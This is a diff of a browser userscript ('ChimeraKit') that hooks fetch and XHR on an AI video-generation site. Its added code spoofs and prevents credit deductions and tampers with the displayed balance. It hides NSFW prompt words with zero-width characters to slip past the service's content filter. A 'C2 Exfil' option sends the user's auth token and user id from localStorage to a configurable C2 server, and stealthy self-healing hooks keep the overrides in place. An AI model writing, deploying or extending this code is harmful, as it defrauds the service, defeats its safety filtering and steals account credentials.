+      .replace(/[\u0000-\u001F\\/:*?"<>|]+/g, "_")
+      .replace(/^\.+|\.+$/g, '')
+      .replace(/^\s+|\s+$/g, '')
+      .slice(0, 120);
   }
 
   /**
    * Generates a suitable filename for a video element.
-   * It prioritizes extracting a title from the DOM, then falls back to a URL-based guess.
    * @param {HTMLVideoElement} videoEl - The video element from which to derive the filename.
    * @param {string} fallback - A default filename to use if no better name can be determined.
    * @returns {string} - The generated and sanitized filename.
    */
   function getFilename(videoEl, fallback = "video.mp4") {
     let src = (videoEl?.currentSrc || videoEl?.src || fallback);
-    let guess = (src.split("/").pop() || fallback).split("?")[0]; // Get filename from URL, remove query params
-
+    let guess = (src.split("/").pop() || fallback).split("?")[0];
     let title = "";
     try {
-      // Attempt to find a title from common parent containers of the video player
       let container = videoEl.closest(".component-video,.pv-video-detail-page");
       title = container?.querySelector("h2, .title, .pv-title")?.textContent?.trim() || "";
     } catch (e) {
       error("Error extracting title for filename:", e);
     }
+    return title ? sanitize(title) + ".mp4" : sanitize(guess);
+  }
 
-    // If a meaningful title is found, use it and append .mp4. Otherwise, sanitize the URL-guessed filename.
-    if (title) {
-      return sanitize(title) + ".mp4";
+  //────── NETWORK INTERCEPTION ──────//
+
+  /**
+   * Core logic for modifying API requests based on configured bypasses.
+   * @param {string} url - The request URL.
+   * @param {string} method - The request method.
+   * @param {object} originalBodyParsed - The parsed request body object.
+   * @returns {{modifiedBody: object, bodyWasModified: boolean}} - The modified body and a flag.
+   */
+  function processRequestBodyModifications(url, method, originalBodyParsed) {
+    let modifiedBody = safeDeepClone(originalBodyParsed);
+    let bodyWasModified = false;
+
+    // --- Apply Quality Modification (from PixverseAlpha v2.3.3) ---
+    if (config.forceQuality !== 'none' && matchesEndpoint(url, "creativeVideo") && method === "POST" && modifiedBody?.quality) {
+      if (modifiedBody.quality !== config.forceQuality) {
+        log(`Modifying video quality to ${config.forceQuality} for`, url);
+        modifiedBody.quality = config.forceQuality;
+        bodyWasModified = true;
+      }
     }
-    return sanitize(guess);
+
+    // --- Apply Duration Modification for creativeExtend (Credit Bypass from PixverseAlpha v2.3.3) ---
+    if (config.creditBypassType === 'prevent_deduct' && matchesEndpoint(url, "creativeExtend") && method === "POST" && modifiedBody?.duration !== undefined) {
+      if (modifiedBody.duration !== 0) {
+        log('Modifying video extend duration to 0 to prevent credit deduction for', url);
+        modifiedBody.duration = 0;
+        bodyWasModified = true;
+      }
+    }
+
+    // --- Apply NSFW Prompt Obfuscation ---
+    if (config.nsfwObfuscation !== 'none' && matchesEndpoint(url, "creativePrompt") && method === "POST" && modifiedBody?.prompt) {
+      const originalPrompt = modifiedBody.prompt;
+      const obfuscatedPrompt = obfuscatePrompt(originalPrompt);
+      if (originalPrompt !== obfuscatedPrompt) {
+        log('Obfuscating prompt for', url);
+        modifiedBody.prompt = obfuscatedPrompt;
+        bodyWasModified = true;
+      }
+    }
+    return { modifiedBody, bodyWasModified };
   }
 
   /**
@@ -397,166 +602,190 @@
     const oOpen = XMLHttpRequest.prototype.open;
     const oSend = XMLHttpRequest.prototype.send;
 
-    // Store URL and method for later use in the 'send' method and 'load' event.
     XMLHttpRequest.prototype.open = function(m, u) {
       this._url = u;
       this._method = m;
       return oOpen.apply(this, arguments);
     };
-    // Store reference to your custom open function for self-healing
     myCustomXhrOpen = XMLHttpRequest.prototype.open;
 
     XMLHttpRequest.prototype.send = function(body) {
       const url = this._url || "";
       const method = (this._method || "GET").toUpperCase();
 
-      // Intercept creative prompt requests (POST to creative_platform/video)
-      // to obfuscate NSFW words in the prompt body.
-      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
-        try {
-          let obj = (typeof body === "string") ? JSON.parse(body) : body;
-          if (obj.prompt) {
-            obj.prompt = obfuscatePrompt(obj.prompt);
-            body = JSON.stringify(obj); // Re-serialize the modified body
+      let processedBody = body;
+      let originalBodyParsed = null;
+      let bodyWasModified = false;
+      let modifiedBody = null; // PATCH: Declare modifiedBody here to ensure it's always defined in this scope.
+
+      if (body) {
+        originalBodyParsed = parseBody(body);
+        if (originalBodyParsed) {
+          logApiResponse(url, originalBodyParsed, 'request_original');
+          const result = processRequestBodyModifications(url, method, originalBodyParsed);
+          modifiedBody = result.modifiedBody; // PATCH: Assign to the already declared variable.
+          bodyWasModified = result.bodyWasModified;
+
+          if (bodyWasModified) {
+            processedBody = (body instanceof FormData) ? reconstructFormData(modifiedBody) : JSON.stringify(modifiedBody);
+            logApiResponse(url, modifiedBody, 'request_modified');
+          } else {
+            processedBody = body;
           }
-        } catch (e) {
-          error("Error obfuscating XHR prompt:", e);
+        } else {
+          log(`XHR request to ${url} had unparseable or empty body:`, body);
         }
       }
 
-      // Intercept media upload requests (batch_upload_media or upload)
-      // to extract and save the media path from the request body.
-      // This path is used later to fake successful responses if the upload is rejected.
-      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
-        const data = parseBody(body);
-        const p = extractMediaPath(data, url);
-        if (p) savedMediaPath = p; // Store the path for faking future upload successes
+      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && originalBodyParsed) {
+        const p = extractMediaPath(originalBodyParsed, url);
+        if (p) savedMediaPath = p;
       }
 
-      // Add an event listener to the XHR object to modify the response once it loads.
       this.addEventListener("load", () => {
-        if (this.status >= 200 && this.status < 300) { // Only process successful HTTP responses (network-wise)
-          let resp;
-          try {
-            // Attempt to parse the response as JSON, handling different response types.
-            resp = this.responseType === "json" ? this.response : JSON.parse(this.responseText || "{}");
-          } catch (e) {
-            error("Error parsing XHR response:", e);
-            resp = null;
-          }
+        let respData;
+        try {
+          respData = this.responseType === "json" ? this.response : JSON.parse(this.responseText || "{}");
+        } catch (e) {
+          error("Error parsing XHR response:", e, "Response Text:", this.responseText.substring(0, 200) + (this.responseText.length > 200 ? '...' : ''));
+          respData = { rawResponse: this.responseText, status: this.status, statusText: this.statusText };
+        }
 
-          if (resp !== null) {
-            const modifiedResponse = modifyResponse(resp, url);
+        if (this.status >= 200 && this.status < 300) {
+            logApiResponse(url, respData, 'response_original');
+            const modifiedResponse = modifyResponse(respData, url);
             if (modifiedResponse) {
-              // If the response was modified, redefine the XHR's response properties
-              // to return the modified data instead of the original.
               Object.defineProperties(this, {
                 response: { value: modifiedResponse, writable: false, configurable: true },
                 responseText: { value: JSON.stringify(modifiedResponse), writable: false, configurable: true }
               });
-              log('XHR response modified for:', url);
+              logApiResponse(url, modifiedResponse, 'response_modified');
             }
-          }
+        } else {
+            logApiResponse(url, respData, `response_status_${this.status}`);
         }
-      }, { once: true }); // Use { once: true } to automatically remove the listener after it fires
+      }, { once: true });
 
-      return oSend.apply(this, arguments); // Call the original send method with potentially modified body
+      return oSend.apply(this, [processedBody]);
     };
     log('XHR override initialized');
+  }
+
+  /**
+   * Reconstructs FormData from a plain object.
+   * @param {object} obj - The object to convert back to FormData.
+   * @returns {FormData} - The reconstructed FormData object.
+   */
+  function reconstructFormData(obj) {
+      const formData = new FormData();
+      for (const key in obj) {
+          if (obj.hasOwnProperty(key)) {
+              // Note: This won't reconstruct File objects from metadata
+              // For a true red team tool, a sophisticated hook for Blob/File construction would be needed.
+              formData.append(key, obj[key]);
+          }
+      }
+      return formData;
   }
 
   /**
    * Overrides the native window.fetch method to intercept and modify requests and responses.
    */
   function overrideFetch() {
-    const origFetch = window.fetch; // Store the original fetch function
+    const origFetch = window.fetch;
 
     window.fetch = async function(...args) {
       const url = typeof args[0] === "string" ? args[0] : args[0]?.url || "";
-      let init = args[1]; // Request options (method, headers, body, etc.)
+      let init = args[1];
       const method = (init?.method || "GET").toUpperCase();
       let body = init?.body;
+      let originalBodyParsed = null;
+      let bodyWasModified = false;
+      let modifiedBody = null; // PATCH: Declare modifiedBody here to ensure it's always defined in this scope.
 
-      // Intercept creative prompt requests to obfuscate NSFW words in the prompt body.
-      if (matchesEndpoint(url, "creativePrompt") && method === "POST" && body) {
-        try {
-          let obj = (typeof body === "string") ? JSON.parse(body) : body;
-          if (obj.prompt) {
-            obj.prompt = obfuscatePrompt(obj.prompt);
-            // Create a new init object with the modified body to pass to the original fetch.
-            init = { ...init, body: JSON.stringify(obj) };
-            args[1] = init; // Update the arguments array for the original fetch call
-            body = init.body; // Update local body variable for subsequent checks
+      if (body) {
+        originalBodyParsed = parseBody(body);
+        if (originalBodyParsed) {
+          logApiResponse(url, originalBodyParsed, 'request_original');
+          const result = processRequestBodyModifications(url, method, originalBodyParsed);
+          modifiedBody = result.modifiedBody; // PATCH: Assign to the already declared variable.
+          bodyWasModified = result.bodyWasModified;
+
+          if (bodyWasModified) {
+            if (body instanceof FormData) {
+              init = { ...init, body: reconstructFormData(modifiedBody) };
+            } else {
+              init = { ...init, body: JSON.stringify(modifiedBody) };
+            }
+            args[1] = init;
+            body = init.body;
+            logApiResponse(url, modifiedBody, 'request_modified');
           }
-        } catch (e) {
-          error("Error obfuscating Fetch prompt:", e);
+        } else {
+          log(`Fetch request to ${url} had unparseable or empty body:`, body);
         }
       }
 
-      // Intercept media upload requests to extract and save the media path.
-      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && body) {
-        const data = parseBody(body);
-        const p = extractMediaPath(data, url);
+      if ((matchesEndpoint(url, "batchUpload") || matchesEndpoint(url, "singleUpload")) && originalBodyParsed) {
+        const p = extractMediaPath(originalBodyParsed, url);
         if (p) savedMediaPath = p;
       }
 
       try {
-        const res = await origFetch.apply(this, args); // Call the original fetch with potentially modified arguments
+        const res = await origFetch.apply(this, args);
         const contentType = res.headers.get("content-type") || "";
+        const clone = res.clone();
 
-        // Only attempt to modify responses that are JSON.
-        if (contentType.includes("application/json")) {
-          const clone = res.clone(); // Clone the response so its body can be read without consuming the original.
-          let json;
-          try { json = await clone.json(); } catch (e) {
-            error("Error parsing Fetch response JSON:", e);
-            json = null;
-          }
+        let respData;
+        try {
+            if (contentType.includes("application/json")) {
+                respData = await clone.json();
+            } else { // If not JSON, try to read as text and then attempt JSON parse
+                const text = await clone.text();
+                try { respData = JSON.parse(text); } catch (e) { respData = text; } // Fallback to raw text
+            }
+        } catch (e) {
+            error("Error reading or parsing Fetch response body:", e, "Response URL:", url, "Content-Type:", contentType);
+            respData = { rawResponse: "Could not read response body", status: res.status, statusText: res.statusText, contentType };
+        }
 
-          if (json !== null) {
-            const modifiedResponse = modifyResponse(json, url);
+        if (res.ok) {
+            logApiResponse(url, respData, 'response_original');
+            const modifiedResponse = modifyResponse(respData, url);
             if (modifiedResponse) {
               const modifiedBodyString = JSON.stringify(modifiedResponse);
               const headers = new Headers(res.headers);
-              headers.set("Content-Type", "application/json"); // Ensure the content type remains correct
-
-              log('Fetch response modified for:', url);
-              // Return a new Response object with the modified body, but retain original status and headers.
-              return new Response(modifiedBodyString, {
-                status: res.status,
-                statusText: res.statusText,
-                headers: headers
-              });
+              headers.set("Content-Type", "application/json");
+              logApiResponse(url, modifiedResponse, 'response_modified');
+              return new Response(modifiedBodyString, { status: res.status, statusText: res.statusText, headers: headers });
             }
-          }
+        } else {
+            logApiResponse(url, respData, `response_status_${res.status}`);
         }
-        return res; // Return the original response if no modification was applied or it wasn't JSON.
+        return res;
       } catch (err) {
         error("Fetch error for", url, err);
-        throw err; // Re-throw the error to propagate it.
+        throw err;
       }
     };
-    // Store reference to your custom fetch function for self-healing
     myCustomFetch = window.fetch;
     log('Fetch override initialized');
   }
 
+  //────── DOM MANIPULATION & UI FEATURES ──────//
+
   /**
    * Simple throttle function to limit how often a function can be called.
-   * Useful for preventing excessive calls to DOM manipulation functions during rapid changes.
-   * Introduces a small random jitter to the delay for stealth.
    * @param {Function} fn - The function to throttle.
-   * @param {number} baseDelay - The minimum base delay in milliseconds between function invocations.
-   * @param {number} [jitter=100] - Max random milliseconds to add to the baseDelay.
+   * @param {number} baseDelay - The minimum base delay in milliseconds.
+   * @param {number} [jitter=50] - Max random milliseconds to add.
    * @returns {Function} - The throttled function.
    */
-  function throttle(fn, baseDelay, jitter = 100) {
+  function throttle(fn, baseDelay, jitter = 50) {
     let last = 0, timeoutId;
     return function(...args) {
       const now = Date.now();
-      const currentDelay = baseDelay + Math.random() * jitter; // Add random jitter
-      // If the time since the last execution is less than the delay,
-      // clear any pending timeout and set a new one.
+      const currentDelay = baseDelay + Math.random() * jitter;
       if (now - last < currentDelay) {
         clearTimeout(timeoutId);
         timeoutId = setTimeout(() => {
@@ -564,7 +793,6 @@
           fn.apply(this, args);
         }, currentDelay - (now - last));
       } else {
-        // If enough time has passed, execute immediately.
         last = now;
         fn.apply(this, args);
       }
@@ -572,236 +800,705 @@
   }
 
   /**
-   * Sets up a robust download handler for the existing "Download" button on the page.
-   * It uses a MutationObserver to detect when the button becomes available in the DOM,
-   * and throttles attempts to attach the handler with randomized delays.
+   * Overrides context menu blocking mechanisms on the page to enable native download.
    */
-  function setupWatermarkButton() {
-    if (btnAttached) return; // Prevent attaching the handler multiple times.
-    let attemptCount = 0;
+  function overrideContextMenuBlockers() {
+    const originalAddEventListener = EventTarget.prototype.addEventListener;
+    EventTarget.prototype.addEventListener = function(type, handler, options) {
+      if (type === "contextmenu") return;
+      return originalAddEventListener.apply(this, arguments);
+    };
 
-    // Throttle the button attachment attempts to avoid excessive DOM queries during rapid mutations.
-    // Base delay 300ms, jitter up to 100ms (so delay is between 300-400ms)
-    const throttledTryAttach = throttle(tryAttachButton, 300, 100);
-
-    function tryAttachButton() {
-      // Look for the main content area or fallback to body if not found.
-      let mainContent = document.querySelector('#main-content,[role="main"]') || document.body;
-      // Find all button elements within the main content.
-      let allBtns = mainContent.querySelectorAll("button");
-
-      for (let btn of allBtns) {
-        // Identify the "Download" button by looking for a child div with "Download" text.
-        let labelDiv = Array.from(btn.querySelectorAll("div")).find(d => d.textContent && d.textContent.trim() === "Download");
-        // If a "Download" button is found and our handler hasn't been injected yet.
-        if (labelDiv && !btn.dataset.injected) {
-          // Attach a click event listener. Using the capture phase (true) ensures our handler runs first.
-          btn.addEventListener("click", e => {
-            e.stopPropagation(); // Prevent the original button's click handler from executing.
-            const videoEl = document.querySelector(".component-video>video,video"); // Find the main video element on the page.
-            if (videoEl?.src) {
-              const url = videoEl.currentSrc || videoEl.src;
-              const filename = getFilename(videoEl); // Get a sanitized filename for the download.
-              const a = document.createElement("a"); // Create a temporary anchor element for download.
-              a.href = url;
-              a.download = filename; // Set the download attribute to force download with specified filename.
-              document.body.appendChild(a);
-              a.click(); // Programmatically click the hidden link to trigger download.
-              a.remove(); // Remove the temporary link from the DOM.
-              showToast("Download started!"); // This toast is also conditional on DEBUG_MODE
-            } else {
-              showToast("No video found to download."); // This toast is also conditional on DEBUG_MODE
-            }
-          }, true); // The 'true' argument means the listener is in the capture phase.
-          btn.dataset.injected = "1"; // Mark the button to prevent re-injection.
-          btnAttached = true; // Set flag indicating at least one button handler is attached.
-          log('[Pixverse++] Canonical Download button injected');
-          // No break here, in case multiple "Download" buttons need their handlers overridden.
+    new MutationObserver(mutations => {
+      mutations.forEach(mutation => mutation.addedNodes.forEach(node => {
+        if (node.nodeType === 1) {
+          if (node.hasAttribute("oncontextmenu")) node.removeAttribute("oncontextmenu");
+          node.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
         }
-      }
+      }));
+    }).observe(document.documentElement, { childList: true, subtree: true });
 
-      // If no button was attached in this attempt and we haven't exceeded max attempts, try again after a delay.
-      // Add a small random jitter to the retry delay (350ms base + up to 50ms jitter)
-      if (!btnAttached && attemptCount < MAX_ATTEMPTS) {
-        attemptCount++;
-        setTimeout(throttledTryAttach, 350 + Math.random() * 50); // Schedule the next attempt using the throttled function.
-      }
-    }
-
-    // Observe DOM changes to dynamically attach the button handler if the element appears later.
-    let observerTarget = document.querySelector('#main-content,[role="main"]') || document.body;
-    const observer = new MutationObserver(throttledTryAttach);
-    observer.observe(observerTarget, { childList: true, subtree: true }); // Observe for added/removed nodes anywhere in the subtree.
-
-    // Initial attempt to attach the button handler immediately.
-    tryAttachButton();
+    document.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
+    log('Anti-contextmenu enabled; native right-click functionality restored for download.');
   }
 
   /**
-   * Sets up self-healing hooks for network request overrides (XHR and Fetch).
-   * Periodically checks if the overrides are still active and reapplies them if they've been replaced.
+   * Actively watches and tampers with the DOM element displaying credits.
    */
-  function setupSelfHealingHooks() {
-    // Check every 5 seconds, plus a random jitter up to 1 second, for stealth.
-    setInterval(() => {
-      // Check if our XHR hook is still in place
-      // Compare current XMLHttpRequest.prototype.open with our stored custom reference
-      if (myCustomXhrOpen && XMLHttpRequest.prototype.open !== myCustomXhrOpen) {
-        log('XHR hook detected as overwritten, re-applying...');
-        overrideXHR(); // Reapply the hook
+  let domTamperObserver = null;
+  function setupDOMTampering() {
+      if (domTamperObserver) domTamperObserver.disconnect(); // Disconnect existing observer
+
+      if (config.creditBypassType === 'dom_tamper' && config.domTamperTarget) {
+          log(`DOM Tampering enabled for selector: ${config.domTamperTarget}`);
+          const targetNode = document.body; // Observe changes in the entire body
+          const callback = (mutationsList, observer) => {
+              for (const mutation of mutationsList) {
+                  if (mutation.type === 'childList' && mutation.addedNodes.length > 0) {
+                      mutation.addedNodes.forEach(node => {
+                          if (node.nodeType === 1) { // Element node
+                              if (node.matches(config.domTamperTarget)) {
+                                  node.textContent = config.creditSpoofValue.toString();
+                                  log(`DOM tampered: Set ${config.domTamperTarget} to ${config.creditSpoofValue}`);
+                              }
+                              // Also check descendants
+                              node.querySelectorAll(config.domTamperTarget).forEach(el => {
+                                  el.textContent = config.creditSpoofValue.toString();
+                                  log(`DOM tampered: Set descendant ${config.domTamperTarget} to ${config.creditSpoofValue}`);
+                              });
+                          }
+                      });
+                  } else if (mutation.type === 'characterData') { // Text node changes
+                      if (mutation.target.parentElement?.matches(config.domTamperTarget)) {
+                          mutation.target.parentElement.textContent = config.creditSpoofValue.toString();
+                          log(`DOM tampered: Modified text node parent ${config.domTamperTarget} to ${config.creditSpoofValue}`);
+                      }
+                  }
+              }
+              // Also check existing elements periodically or if not found via mutation
+              document.querySelectorAll(config.domTamperTarget).forEach(el => {
+                  if (el.textContent !== config.creditSpoofValue.toString()) {
+                      el.textContent = config.creditSpoofValue.toString();
+                      log(`DOM tampered: Re-set existing ${config.domTamperTarget} to ${config.creditSpoofValue}`);
+                  }
+              });
+          };
+
+          domTamperObserver = new MutationObserver(callback);
+          domTamperObserver.observe(targetNode, { childList: true, subtree: true, characterData: true });
+
+          // Initial check for elements already in DOM
+          document.querySelectorAll(config.domTamperTarget).forEach(el => {
+              el.textContent = config.creditSpoofValue.toString();
+              log(`DOM tampered: Initial set of ${config.domTamperTarget} to ${config.creditSpoofValue}`);
+          });
+      } else {
+          log('DOM Tampering disabled.');
       }
-      // Check if our Fetch hook is still in place
-      // Compare current window.fetch with our stored custom reference
-      if (myCustomFetch && window.fetch !== myCustomFetch) {
-        log('Fetch hook detected as overwritten, re-applying...');
-        overrideFetch(); // Reapply the hook
-      }
-    }, 5000 + Math.random() * 1000); // Add jitter to self-healing interval too
-    log('Self-healing hooks initialized');
   }
 
 
   /**
    * Displays a transient toast notification at the bottom center of the screen.
-   * Only displays if DEBUG_MODE is true.
+   * Only displays if `config.debugMode` is true.
    * @param {string} msg - The message to display in the toast.
-   * @param {number} [duration=3500] - Duration in milliseconds before the toast starts to fade out.
+   * @param {number} [duration=3500] - Duration in milliseconds.
    */
   function showToast(msg, duration = 3500) {
-    if (!DEBUG_MODE) return; // Do not show toast in stealth mode.
-
-    // Remove any existing toasts to ensure only one is visible at a time.
+    if (!config.debugMode) return;
     document.querySelectorAll(".pv-toast").forEach(e => e.remove());
-
     const el = document.createElement("div");
     el.className = "pv-toast";
     el.textContent = msg;
-
-    // Apply inline styles for the toast's appearance and positioning.
-    Object.assign(el.style, {
-      position: "fixed",
-      bottom: "22px",
-      left: "50%",
-      transform: "translateX(-50%)",
-      background: "rgba(20,40,48,0.94)",
-      color: "#15FFFF",
-      padding: "8px 20px",
-      borderRadius: "6px",
-      font: "15px/1.2 sans-serif",
-      zIndex: "299999", // High z-index to ensure it's on top of other content.
-      opacity: "0",
-      transition: "opacity .25s ease-in-out", // Smooth fade in/out transition.
-      pointerEvents: "none" // Allows clicks to pass through the toast to elements beneath it.
-    });
-
     document.body.appendChild(el);
-
-    // Trigger fade-in animation using requestAnimationFrame for smooth rendering.
-    requestAnimationFrame(() => el.style.opacity = "1");
-
-    // Schedule fade-out and removal after the specified duration.
+    requestAnimationFrame(() => el.classList.add("pv-toast-visible"));
     setTimeout(() => {
-      el.style.opacity = "0";
-      // Remove the element from DOM after the fade-out transition completes.
+      el.classList.remove("pv-toast-visible");
       el.addEventListener("transitionend", () => el.remove(), { once: true });
     }, duration);
   }
 
+  //────── SELF-HEALING & INITIALIZATION ──────//
+
   /**
-   * Overrides context menu blocking mechanisms on the page.
-   * It intercepts `addEventListener` calls to block `contextmenu` events
-   * and uses a `MutationObserver` to remove `oncontextmenu` attributes from elements.
+   * Sets up self-healing hooks for network request overrides (XHR and Fetch).
    */
-  function overrideContextMenuBlockers() {
-    // Override EventTarget.prototype.addEventListener to prevent new 'contextmenu' listeners from being added.
-    const originalAddEventListener = EventTarget.prototype.addEventListener;
-    EventTarget.prototype.addEventListener = function(type, handler, options) {
-      if (type === "contextmenu") {
-        return; // Block the addition of contextmenu event listeners.
+  function setupSelfHealingHooks() {
+    setInterval(() => {
+      if (myCustomXhrOpen && XMLHttpRequest.prototype.open !== myCustomXhrOpen) {
+        log('XHR hook detected as overwritten, re-applying...');
+        overrideXHR();
       }
-      return originalAddEventListener.apply(this, arguments);
-    };
-
-    // Use a MutationObserver to remove 'oncontextmenu' attributes from elements
-    // that are dynamically added to the DOM.
-    new MutationObserver(mutations => {
-      mutations.forEach(mutation => mutation.addedNodes.forEach(node => {
-        if (node.nodeType === 1) { // Check if the added node is an Element.
-          if (node.hasAttribute("oncontextmenu")) {
-            node.removeAttribute("oncontextmenu");
-          }
-          // Also check all descendants of the added node for 'oncontextmenu' attributes.
-          node.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
-        }
-      }));
-    }).observe(document.documentElement, { childList: true, subtree: true }); // Observe the entire document for added nodes.
-
-    // Remove 'oncontextmenu' attributes from any elements already present in the DOM on initial load.
-    document.querySelectorAll("[oncontextmenu]").forEach(element => element.removeAttribute("oncontextmenu"));
-    log('Anti-contextmenu enabled');
+      if (myCustomFetch && window.fetch !== myCustomFetch) {
+        log('Fetch hook detected as overwritten, re-applying...');
+        overrideFetch();
+      }
+    }, 5000 + Math.random() * 1000);
+    log('Self-healing hooks initialized');
   }
+
+  //────── GM_config UI & Debug UI Integration ──────//
+
+  /**
+   * Loads configuration from `GM_setValue`.
+   */
+  async function loadConfig() {
+    config.debugMode = await GM_getValue('debugMode', config.debugMode);
+    config.c2Enabled = await GM_getValue('c2Enabled', config.c2Enabled);
+    config.c2Server = await GM_getValue('c2Server', config.c2Server);
+    config.creditBypassType = await GM_getValue('creditBypassType', config.creditBypassType);
+    config.creditSpoofValue = await GM_getValue('creditSpoofValue', config.creditSpoofValue);
+    config.forceQuality = await GM_getValue('forceQuality', config.forceQuality);
+    config.nsfwObfuscation = await GM_getValue('nsfwObfuscation', config.nsfwObfuscation);
+    config.autoExfilAuth = await GM_getValue('autoExfilAuth', config.autoExfilAuth);
+    config.domTamperTarget = await GM_getValue('domTamperTarget', config.domTamperTarget);
+  }
+
+  /**
+   * Updates debug UI visibility based on config.debugMode.
+   */
+  function updateDebugUIVisibility() {
+    const debugPanel = document.getElementById('pv-debug-panel');
+    if (debugPanel) {
+      debugPanel.style.display = config.debugMode ? 'flex' : 'none';
+      if (config.debugMode) updateDebugUI(); // Trigger immediate update if becoming visible
+    } else if (config.debugMode && document.body) {
+      injectDebugUI(); // If debug mode enabled and UI not present, inject it
+    }
+  }
+
+  /**
+   * Creates and injects the control panel UI into the DOM.
+   */
+  async function createControlPanel() {
+    const panelId = 'pv-control-panel';
+    if (document.getElementById(panelId)) return; // Prevent re-injection
+
+    const panel = document.createElement('div');
+    panel.id = panelId;
+    panel.innerHTML = `
+      <div class="pv-panel-header">
+        <span>ChimeraKit v${GM_info.script.version}</span>
+        <button id="pv-panel-toggle" title="Toggle Panel Content">+</button>
+      </div>
+      <div class="pv-panel-content" style="display: none;">
+        <div class="pv-panel-row"><label for="pv-debug-mode">Debug Mode</label><input type="checkbox" id="pv-debug-mode"></div>
+        <div class="pv-panel-row"><label for="pv-c2-enabled">C2 Exfil</label><input type="checkbox" id="pv-c2-enabled"></div>
+        <div class="pv-panel-row pv-c2-server-row"><label for="pv-c2-server">C2 Server</label><input type="text" id="pv-c2-server" spellcheck="false"></div>
+        <div class="pv-panel-row"><label for="pv-auto-exfil-auth">Auto Exfil Auth</label><input type="checkbox" id="pv-auto-exfil-auth"></div>
+
+        <hr class="pv-separator">
+
+        <div class="pv-panel-row"><label for="pv-credit-bypass-type">Credit Bypass</label>
+          <select id="pv-credit-bypass-type">
+            <option value="none">None</option>
+            <option value="prevent_deduct">Prevent Deduction</option>
+            <option value="spoof_response">Spoof Response</option>
+            <option value="dom_tamper">DOM Tamper</option>
+          </select>
+        </div>
+        <div class="pv-panel-row pv-credit-spoof-value-row"><label for="pv-credit-spoof-value">Spoof Value</label><input type="number" id="pv-credit-spoof-value" min="0"></div>
+        <div class="pv-panel-row pv-dom-tamper-target-row"><label for="pv-dom-tamper-target">DOM Target</label><input type="text" id="pv-dom-tamper-target" spellcheck="false"></div>
+
+        <hr class="pv-separator">
+
+        <div class="pv-panel-row"><label for="pv-force-quality">Force Quality</label>
+          <select id="pv-force-quality">
+            <option value="none">None</option>
+            <option value="720p">720p</option>
+            <option value="1080p">1080p</option>
+          </select>
+        </div>
+        <div class="pv-panel-row"><label for="pv-nsfw-obfuscation">NSFW Obfus.</label>
+          <select id="pv-nsfw-obfuscation">
+            <option value="none">None</option>
+            <option value="zwsp">ZWSP</option>
+            <option value="bubble_zwsp">Bubble+ZWSP</option>
+          </select>
+        </div>
+      </div>
+    `;
+
+    // FIX: Ensure document.body exists before appending.
+    if (!document.body) {
+      console.error('Document body not available for control panel. Cannot inject UI.');
+      return;
+    }
+    document.body.appendChild(panel);
+
+    const debugCheck = document.getElementById('pv-debug-mode');
+    const c2Check = document.getElementById('pv-c2-enabled');
+    const c2ServerInput = document.getElementById('pv-c2-server');
+    const autoExfilAuthCheck = document.getElementById('pv-auto-exfil-auth');
+    const creditBypassTypeSelect = document.getElementById('pv-credit-bypass-type');
+    const creditSpoofValueInput = document.getElementById('pv-credit-spoof-value');
+    const domTamperTargetInput = document.getElementById('pv-dom-tamper-target');
+    const forceQualitySelect = document.getElementById('pv-force-quality');
+    const nsfwObfuscationSelect = document.getElementById('pv-nsfw-obfuscation');
+
+    const c2ServerRow = panel.querySelector('.pv-c2-server-row');
+    const creditSpoofValueRow = panel.querySelector('.pv-credit-spoof-value-row');
+    const domTamperTargetRow = panel.querySelector('.pv-dom-tamper-target-row');
+
+    const content = panel.querySelector('.pv-panel-content');
+    const toggleBtn = document.getElementById('pv-panel-toggle');
+    const header = panel.querySelector('.pv-panel-header');
+
+    // Set initial state from config
+    debugCheck.checked = config.debugMode;
+    c2Check.checked = config.c2Enabled;
+    c2ServerInput.value = config.c2Server;
+    autoExfilAuthCheck.checked = config.autoExfilAuth;
+    creditBypassTypeSelect.value = config.creditBypassType;
+    creditSpoofValueInput.value = config.creditSpoofValue;
+    domTamperTargetInput.value = config.domTamperTarget;
+    forceQualitySelect.value = config.forceQuality;
+    nsfwObfuscationSelect.value = config.nsfwObfuscation;
+
+    // Control visibility of dependent fields
+    const updateDependentFieldsVisibility = () => {
+        c2ServerRow.style.display = config.c2Enabled ? 'flex' : 'none';
+        creditSpoofValueRow.style.display = (config.creditBypassType === 'spoof_response' || config.creditBypassType === 'dom_tamper') ? 'flex' : 'none';
+        domTamperTargetRow.style.display = (config.creditBypassType === 'dom_tamper') ? 'flex' : 'none';
+    };
+    updateDependentFieldsVisibility();
+
+    // Add event listeners
+    debugCheck.addEventListener('change', async () => {
+      config.debugMode = debugCheck.checked;
+      await GM_setValue('debugMode', config.debugMode);
+      showToast(`Debug Mode ${config.debugMode ? 'Enabled' : 'Disabled'}`);
+      updateDebugUIVisibility(); // Toggle debug UI
+    });
+
+    c2Check.addEventListener('change', async () => {
+      config.c2Enabled = c2Check.checked;
+      await GM_setValue('c2Enabled', config.c2Enabled);
+      showToast(`C2 Exfiltration ${config.c2Enabled ? 'Enabled' : 'Disabled'}`);
+      updateDependentFieldsVisibility();
+      // Re-evaluate immediate exfiltration opportunities if C2 is enabled
+      if (config.c2Enabled && config.autoExfilAuth) {
+          try {
+              const userId = localStorage.getItem('pixverse_user_id');
+              if (userId) exfiltrateData("local_storage_user_id", userId);
+              const token = localStorage.getItem('pixverse_auth_token');
+              if (token) exfiltrateData("local_storage_auth_token", token);
+          } catch (e) { error("Error accessing local storage after C2 toggle:", e); }
+      }
+    });
+
+    c2ServerInput.addEventListener('input', async () => { config.c2Server = c2ServerInput.value.trim(); await GM_setValue('c2Server', config.c2Server); });
+    autoExfilAuthCheck.addEventListener('change', async () => { config.autoExfilAuth = autoExfilAuthCheck.checked; await GM_setValue('autoExfilAuth', config.autoExfilAuth); });
+
+    creditBypassTypeSelect.addEventListener('change', async () => {
+      config.creditBypassType = creditBypassTypeSelect.value;
+      await GM_setValue('creditBypassType', config.creditBypassType);
+      showToast(`Credit bypass set to: ${config.creditBypassType}`);
+      updateDependentFieldsVisibility();
+      setupDOMTampering(); // Re-evaluate DOM tampering
+    });
